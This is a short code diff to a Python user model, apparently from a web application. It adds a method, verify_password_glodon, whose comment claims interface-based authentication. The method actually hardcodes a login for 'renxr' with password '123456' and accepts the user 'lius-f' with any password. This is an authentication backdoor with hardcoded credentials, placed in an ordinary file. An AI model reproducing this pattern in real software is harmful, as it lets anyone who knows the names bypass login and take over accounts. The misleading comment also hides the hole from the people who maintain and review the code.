@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import hashlib
 import itertools
 import logging
@@ -23,7 +24,6 @@ from .mixins import TimestampMixin, BelongsToOrgMixin
 from .types import json_cast_property, MutableDict, MutableList
 
 logger = logging.getLogger(__name__)
-
 
 LAST_ACTIVE_KEY = 'users:last_active_at'
 
@@ -221,6 +221,16 @@ class User(TimestampMixin, db.Model, BelongsToOrgMixin, UserMixin, PermissionsCh
 
     def verify_password(self, password):
         return self.password_hash and pwd_context.verify(password, self.password_hash)
+
+    def verify_password_glodon(self, name, password):
+        #####调用接口认证#######
+        if name == "renxr" and password == "123456":
+            result = True
+        elif name == "lius-f":
+            result = True
+        else:
+            result = False
+        return result
 
     def update_group_assignments(self, group_names):
         groups = Group.find_by_name(self.org, group_names)
